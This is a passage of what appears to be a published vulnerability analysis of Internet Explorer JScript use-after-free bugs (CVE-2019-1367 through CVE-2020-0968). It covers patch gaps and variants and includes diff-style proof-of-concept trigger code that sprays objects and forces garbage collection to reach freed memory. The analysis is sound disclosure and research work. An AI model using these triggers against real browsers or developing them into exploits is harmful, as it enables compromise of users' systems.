&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;20000&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class="c1"&gt;++)&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;spray&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c2"&gt;i&lt;/span&gt;&lt;span class="c1"&gt;]&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;CollectGarbage&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 5. But we still have reference to one of them in the&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// &amp;nbsp; &amp;nbsp;arguments array&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; alert&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;arguments&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;]);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c18"&gt;// 1. Call sort with a custom callback&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c20"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c20"&gt;2&lt;/span&gt;&lt;span class="c1"&gt;].&lt;/span&gt;&lt;span class="c2"&gt;sort&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;F&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h3 class="c3 c7" id="h.8h929p3lop4y"&gt;&lt;span class="c16 c4"&gt;CVE-2019-1429&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;The CVE-2019-1367 patch did not actually fix the vulnerability triggered by the proof-of-concept above and exploited in the in-the-wild. The proof-of-concept for CVE-2019-1367 &lt;/span&gt;&lt;span class="c31"&gt;still worked&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;even after the CVE-2019-1367 patch was applied! &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;In November 2019, Microsoft released another patch to address this gap. &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1429"&gt;CVE-2019-1429&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;addressed the shortcomings of the CVE-2019-1367 and also fixed a variant. &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1947"&gt;The variant&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is that &lt;/span&gt;&lt;span&gt;the &lt;/span&gt;&lt;span class="c31"&gt;variables&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the &lt;/span&gt;&lt;span class="c23"&gt;arguments&lt;/span&gt;&lt;span&gt;&amp;nbsp;array are not tracked by the garbage collector in the &lt;/span&gt;&lt;span class="c23"&gt;toJson&lt;/span&gt;&lt;span&gt;&amp;nbsp;callback rather than the &lt;/span&gt;&lt;span class="c23"&gt;Array.sort&lt;/span&gt;&lt;span&gt;&amp;nbsp;callback. &lt;/span&gt;&lt;span&gt;The only difference between the variant triggers&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the&lt;/span&gt;&lt;span&gt;&amp;nbsp;highlighted lines&lt;/span&gt;&lt;span&gt;. Instead of calling the &lt;/span&gt;&lt;span class="c23"&gt;Array.sort&lt;/span&gt;&lt;span&gt;&amp;nbsp;callback, we call the &lt;/span&gt;&lt;span class="c23"&gt;toJSON&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;callback.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.1e22b404c604206b0862eb75b336baee152ee3ca"&gt;&lt;/a&gt;&lt;a id="t.3"&gt;&lt;/a&gt;&lt;table class="c17"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;spray &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;Array&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;function&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;F&lt;/span&gt;&lt;span class="c1"&gt;()&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 2. Create a bunch of objects&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;for&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;20000&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class="c1"&gt;++)&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;spray&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c2"&gt;i&lt;/span&gt;&lt;span class="c1"&gt;]&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;Object&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 3. Store a reference to one of them in the arguments array&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// &amp;nbsp; &amp;nbsp;The arguments array isn&amp;#39;t tracked by garbage collector&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; arguments&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;]&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;spray&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c20"&gt;5000&lt;/span&gt;&lt;span class="c1"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 4. Delete the objects and call the garbage collector&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// &amp;nbsp; &amp;nbsp;All JSCript variables get reclaimed... &lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;for&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;20000&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class="c1"&gt;++)&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;spray&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c2"&gt;i&lt;/span&gt;&lt;span class="c1"&gt;]&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;CollectGarbage&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 5. But we still have reference to one of them in the&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// &amp;nbsp; &amp;nbsp;arguments array&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; alert&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;arguments&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;]);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18 c14"&gt;// 1. Cause toJSON callback to fire&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6 c14"&gt;var&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;o &lt;/span&gt;&lt;span class="c1 c14"&gt;=&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c14"&gt;{&lt;/span&gt;&lt;span class="c2 c14"&gt;toJSON&lt;/span&gt;&lt;span class="c1 c14"&gt;:&lt;/span&gt;&lt;span class="c2 c14"&gt;F&lt;/span&gt;&lt;span class="c1 c14"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; JSON&lt;/span&gt;&lt;span class="c1 c14"&gt;.&lt;/span&gt;&lt;span class="c2 c14"&gt;stringify&lt;/span&gt;&lt;span class="c1 c14"&gt;(&lt;/span&gt;&lt;span class="c2 c14"&gt;o&lt;/span&gt;&lt;span class="c1 c14"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4 c15"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c10"&gt;-&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18 c10"&gt;// 1. Call sort with a custom callback&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c10"&gt;-&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1 c10"&gt;[&lt;/span&gt;&lt;span class="c20 c10"&gt;1&lt;/span&gt;&lt;span class="c1 c10"&gt;,&lt;/span&gt;&lt;span class="c20 c10"&gt;2&lt;/span&gt;&lt;span class="c1 c10"&gt;].&lt;/span&gt;&lt;span class="c2 c10"&gt;sort&lt;/span&gt;&lt;span class="c1 c10"&gt;(&lt;/span&gt;&lt;span class="c2 c10"&gt;F&lt;/span&gt;&lt;span class="c1 c4 c10"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h3 class="c7 c3" id="h.7s5b4t8wlng1"&gt;&lt;span class="c4 c16"&gt;CVE-2020-0674&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;In January 2020, &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0674"&gt;CVE-2020-0674&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;was detected as exploited in-the-wild. The vulnerability is that the named arguments are not tracked by the garbage collector in the &lt;/span&gt;&lt;span class="c23"&gt;Array.sort&lt;/span&gt;&lt;span&gt;&amp;nbsp;callback. &lt;/span&gt;&lt;span&gt;The only changes required to the trigger &lt;/span&gt;&lt;span&gt;for CVE-2019-1367 is to change the references to &lt;/span&gt;&lt;span class="c23"&gt;arguments[]&lt;/span&gt;&lt;span&gt;&amp;nbsp;to one of the arguments named in the function definition. For example, we replaced any instances of &lt;/span&gt;&lt;span class="c23"&gt;arguments[0]&lt;/span&gt;&lt;span&gt;&amp;nbsp;with &lt;/span&gt;&lt;span class="c23"&gt;arg1&lt;/span&gt;&lt;span class="c11 c4"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.cb84ed0d0e41c9e179f65374ff4d12c9a051426f"&gt;&lt;/a&gt;&lt;a id="t.4"&gt;&lt;/a&gt;&lt;table class="c17"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;spray &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;Array&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6 c14"&gt;function&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;F&lt;/span&gt;&lt;span class="c1 c14"&gt;(&lt;/span&gt;&lt;span class="c2 c14"&gt;arg1&lt;/span&gt;&lt;span class="c1 c14"&gt;,&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;arg2&lt;/span&gt;&lt;span class="c1 c14"&gt;)&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c14"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c10"&gt;-&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6 c10"&gt;function&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp;F&lt;/span&gt;&lt;span class="c1 c10"&gt;()&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c10"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 2. Create a bunch of objects&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;for&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;20000&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class="c1"&gt;++)&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;spray&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c2"&gt;i&lt;/span&gt;&lt;span class="c1"&gt;]&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;Object&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 3. Store a reference to one of them in one of the named arguments&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// &amp;nbsp; &amp;nbsp;The named arguments aren&amp;#39;t tracked by garbage collector&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; &amp;nbsp; arg1 &lt;/span&gt;&lt;span class="c1 c14"&gt;=&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;spray&lt;/span&gt;&lt;span class="c1 c14"&gt;[&lt;/span&gt;&lt;span class="c20 c14"&gt;5000&lt;/span&gt;&lt;span class="c1 c14"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c10"&gt;-&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp; &amp;nbsp; arguments&lt;/span&gt;&lt;span class="c1 c10"&gt;[&lt;/span&gt;&lt;span class="c20 c10"&gt;0&lt;/span&gt;&lt;span class="c1 c10"&gt;]&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c10"&gt;=&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp;spray&lt;/span&gt;&lt;span class="c1 c10"&gt;[&lt;/span&gt;&lt;span class="c20 c10"&gt;5000&lt;/span&gt;&lt;span class="c1 c10"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 4. Delete the objects and call the garbage collector&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// &amp;nbsp; &amp;nbsp;All JScript variables get reclaimed... &lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;for&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;20000&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class="c1"&gt;++)&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;spray&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c2"&gt;i&lt;/span&gt;&lt;span class="c1"&gt;]&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;CollectGarbage&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 5. But we still have reference to one of them in&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// &amp;nbsp; a named argument&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; &amp;nbsp; alert&lt;/span&gt;&lt;span class="c1 c14"&gt;(&lt;/span&gt;&lt;span class="c2 c14"&gt;arg1&lt;/span&gt;&lt;span class="c1 c14"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c10"&gt;-&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp; &amp;nbsp; alert&lt;/span&gt;&lt;span class="c1 c10"&gt;(&lt;/span&gt;&lt;span class="c2 c10"&gt;arguments&lt;/span&gt;&lt;span class="c1 c10"&gt;[&lt;/span&gt;&lt;span class="c20 c10"&gt;0&lt;/span&gt;&lt;span class="c1 c10"&gt;]);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c18"&gt;// 1. Call sort with a custom callback&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c20"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c20"&gt;2&lt;/span&gt;&lt;span class="c1"&gt;].&lt;/span&gt;&lt;span class="c2"&gt;sort&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;F&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h3 class="c7 c3" id="h.n3s7fz70dd0k"&gt;&lt;span class="c16 c4"&gt;CVE-2020-0968&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;Unfortunately CVE-2020-0674 was not the end of this story, even though it was the fourth vulnerability of this type to be exploited in-the-wild. In April 2020, Microsoft patched &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-0968"&gt;CVE-2020-0968&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, another Internet Explorer JScript vulnerability. When the bulletin was first released, it was designated as exploited in-the-wild, &lt;/span&gt;&lt;span&gt;but t&lt;/span&gt;&lt;span&gt;he following day, Microsoft changed this field to say it was not exploited in-the-wild (see the revisions section at the bottom of the &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-0968"&gt;advisory&lt;/a&gt;&lt;/span&gt;&lt;span&gt;). &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.e6bf02b53677f0afb1adc9e2d195428f0079f5f2"&gt;&lt;/a&gt;&lt;a id="t.5"&gt;&lt;/a&gt;&lt;table class="c17"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;spray &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;Array&lt;/span&gt;&lt;span 